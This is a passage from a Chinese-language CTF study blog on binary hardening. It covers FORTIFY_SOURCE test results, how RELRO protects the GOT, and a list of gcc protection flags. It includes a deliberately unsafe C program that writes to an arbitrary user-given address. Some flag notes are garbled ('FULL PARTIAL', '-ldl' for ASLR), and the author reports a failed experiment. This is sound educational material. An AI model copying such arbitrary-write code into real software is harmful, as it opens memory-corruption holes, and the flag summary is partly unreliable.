[rbx+0x18]</span><br><span class="line">   0x00000000000011d5 &lt;+96&gt;:    mov    edx,0xa</span><br><span class="line">   0x00000000000011da &lt;+101&gt;:   mov    esi,0x0</span><br><span class="line">   0x00000000000011df &lt;+106&gt;:   call   0x1040 &lt;strtol@plt&gt;</span><br><span class="line">   0x00000000000011e4 &lt;+111&gt;:   movsxd rdx,eax</span><br><span class="line">   0x00000000000011e7 &lt;+114&gt;:   mov    rsi,QWORD PTR [rbx+0x10]</span><br><span class="line">   0x00000000000011eb &lt;+118&gt;:   mov    ecx,0xa</span><br><span class="line">   0x00000000000011f0 &lt;+123&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00000000000011f3 &lt;+126&gt;:   call   0x1030 &lt;__memcpy_chk@plt&gt;</span><br><span class="line">   0x00000000000011f8 &lt;+131&gt;:   mov    rsi,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x00000000000011fc &lt;+135&gt;:   mov    edx,0xa</span><br><span class="line">   0x0000000000001201 &lt;+140&gt;:   mov    rdi,r12</span><br><span class="line">   0x0000000000001204 &lt;+143&gt;:   call   0x1060 &lt;__strcpy_chk@plt&gt;</span><br><span class="line">   0x0000000000001209 &lt;+148&gt;:   mov    rcx,r12</span><br><span class="line">   0x000000000000120c &lt;+151&gt;:   mov    rdx,rbp</span><br><span class="line">   0x000000000000120f &lt;+154&gt;:   lea    rsi,[rip+0xdee]        # 0x2004</span><br><span class="line">   0x0000000000001216 &lt;+161&gt;:   mov    edi,0x1</span><br><span class="line">   0x000000000000121b &lt;+166&gt;:   mov    eax,0x0</span><br><span class="line">   0x0000000000001220 &lt;+171&gt;:   call   0x1070 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x0000000000001225 &lt;+176&gt;:   mov    rsi,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x0000000000001229 &lt;+180&gt;:   mov    ecx,0xa</span><br><span class="line">   0x000000000000122e &lt;+185&gt;:   mov    edx,0xb</span><br><span class="line">   0x0000000000001233 &lt;+190&gt;:   mov    rdi,rbp</span><br><span class="line">   0x0000000000001236 &lt;+193&gt;:   call   0x1030 &lt;__memcpy_chk@plt&gt;</span><br><span class="line">   0x000000000000123b &lt;+198&gt;:   mov    edx,0xa</span><br><span class="line">   0x0000000000001240 &lt;+203&gt;:   lea    rsi,[rip+0xdc4]        # 0x200b</span><br><span class="line">   0x0000000000001247 &lt;+210&gt;:   mov    rdi,r12</span><br><span class="line">   0x000000000000124a &lt;+213&gt;:   call   0x1060 &lt;__strcpy_chk@plt&gt;</span><br><span class="line">   0x000000000000124f &lt;+218&gt;:   mov    rcx,QWORD PTR [rip+0x2dfa]        # 0x4050 &lt;stdin@GLIBC_2.2.5&gt;</span><br><span class="line">   0x0000000000001256 &lt;+225&gt;:   mov    edx,0xb</span><br><span class="line">   0x000000000000125b &lt;+230&gt;:   mov    esi,0xa</span><br><span class="line">   0x0000000000001260 &lt;+235&gt;:   mov    rdi,rbp</span><br><span class="line">   0x0000000000001263 &lt;+238&gt;:   call   0x1050 &lt;__fgets_chk@plt&gt;</span><br><span class="line">   0x0000000000001268 &lt;+243&gt;:   lea    rdx,[rsp+0x8]</span><br><span class="line">   0x000000000000126d &lt;+248&gt;:   mov    rsi,rbp</span><br><span class="line">   0x0000000000001270 &lt;+251&gt;:   mov    edi,0x1</span><br><span class="line">   0x0000000000001275 &lt;+256&gt;:   mov    eax,0x0</span><br><span class="line">   0x000000000000127a &lt;+261&gt;:   call   0x1070 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x000000000000127f &lt;+266&gt;:   mov    eax,0x0</span><br><span class="line">   0x0000000000001284 &lt;+271&gt;:   add    rsp,0x20</span><br><span class="line">   0x0000000000001288 &lt;+275&gt;:   pop    rbx</span><br><span class="line">   0x0000000000001289 &lt;+276&gt;:   pop    rbp</span><br><span class="line">   0x000000000000128a &lt;+277&gt;:   pop    r12</span><br><span class="line">   0x000000000000128c &lt;+279&gt;:   ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>fortify1测试结果，在strcpy中出现溢出，被检测到了。但是任然可以使用格式化字符串漏洞。</p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230253141-1679640012.png" /></p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230253221-1782900717.png" /></p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230253265-1403602704.png" /></p>
<p>使用fortify2实验，%n和%N$ 被检测到了。而且%N$需要从%1$x后开始连续可用，下图中仅打印出一个。</p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230253222-158387292.png" /></p>
<h2 id="relro">RELRO</h2>
<h3 id="简介-4">简介</h3>
<p>在启用延时绑定时，符号的解析只发生在第一次使用的时候，该过程是通过PLT表进行的，解析完成后，相应的GOT表条目才会修改为正确的函数地址。因此，在延迟绑定的情况下，.got.plt必须是可写的。攻击者就可以通过篡改地址劫持程序。</p>
<p>RELRO(Relocation Read-Only)机制的提出就是为了解决延时绑定的安全问题。将符号重定向表设置为只读，或者在程序启动时就解析绑定所有的动态符号，从而避免GOT被篡改。RELRO有两种形式：</p>
<ul>
<li><p>Partial RELRO : 一些段（.dynamic , .got等在初始化后将会被标记为只读），默认开启。</p></li>
<li><p>Full RELRO： 除了Partial RELRO，延时绑定被禁止，所有的导入符号将在开始时被解析,.got.plt段会被完全初始化为目标函数的最终地址，并被mprotect标记为只读，但是.got.plt会被合并到.got，也就看不到这段了。会对性能造成影响。</p></li>
</ul>
<h3 id="实验-4">实验</h3>
<p>relro.c 意思就是输入一个16进制地址，然后向该地址写入4141414141414141</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>*argv[])</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sdsd&quot;</span>);</span><br><span class="line">    <span class="keyword">size_t</span> * p=(<span class="keyword">size_t</span>*)strtol(argv[<span class="number">1</span>],<span class="literal">NULL</span>,<span class="number">16</span>);</span><br><span class="line">    p[<span class="number">0</span>]=<span class="number">0x41414141</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;RELRO: %x\n&quot;</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span> )*p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实验过程失败了，按照书来的出现一个问题</p>
<p>动态重定位表中，main始终是R_X86_64_GLOB_DAT, 书上应该是和printf相同的才对。</p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230253327-225509548.png" /></p>
<p>结论：norelro，可以修改.got和.got.plt</p>
<pre><code>  partial可以修改.got.plt</code></pre>
<p>full一个都不能修改</p>
<p>不能修改情况如下，当然可能有其他的原因</p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702230253255-1376568986.png" /></p>
<h3 id="实现-2">实现</h3>
<p>有延时绑定时，call会先跳到printf@plt，然后jmp到.got.plt项，再跳归来进行符号绑定，完成后.got.plt修改为真正的函数地址。</p>
<p>没有延时绑定时，所有解析工作在程序加载时完成，执行call指令跳转到对应的.plt.got项，然后jmp到对应的.got项，已经保存了解析好的函数地址。</p>
<h2 id="编译选项总结">编译选项总结</h2>
<p>stack canaries</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">-fstack-protector        对alloca系列函数和内部缓冲区大于<span class="number">8</span>字节的函数启用保护</span><br><span class="line">-fstack-protector-strong 增加对包含局部数组定和地址引用的函数的保护</span><br><span class="line">-fstack-protector-all    对所有函数启用保护</span><br><span class="line">-fstack-protector-<span class="keyword">explicit</span> 对包含stack_protect属性的函数启用保护</span><br><span class="line">-fno-<span class="built_in">stack</span>-protector       禁用保护</span><br></pre></td></tr></table></figure>
<p>nx</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-z execstack</span><br><span class="line">-z no execstack</span><br></pre></td></tr></table></figure>
<p>ASLR</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-ldl</span><br></pre></td></tr></table></figure>
<p>PIE</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-fpic   为共享库生成位置无关代码</span><br><span class="line">-pie    生成动态链接的位置无关可执行文件，通常需要同时指定-fpie</span><br><span class="line">-no-pie 不生成动态链接的位置无关可执行文件</span><br><span class="line">-fpie   类似于-fpic，但生成的位置无关代码只能用于可执行文件</span><br><span class="line">-fno-pie 不生成位置无关代码</span><br></pre></td></tr></table></figure>
<p>FORTIFY_SOURCE</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-D_FORTIFY_SOURCE=1   开启缓冲区溢出攻击检查</span><br><span class="line">-D_FORTIFY_SOURCE=2   开启缓冲区溢出以及格式化字符串攻击检查</span><br></pre></td></tr></table></figure>
<p>RELRO</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-z norelro              禁用relro</span><br><span class="line">-z lazy                 开启Partial RELRO</span><br><span class="line">-z now                  FULL PARTIAL</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
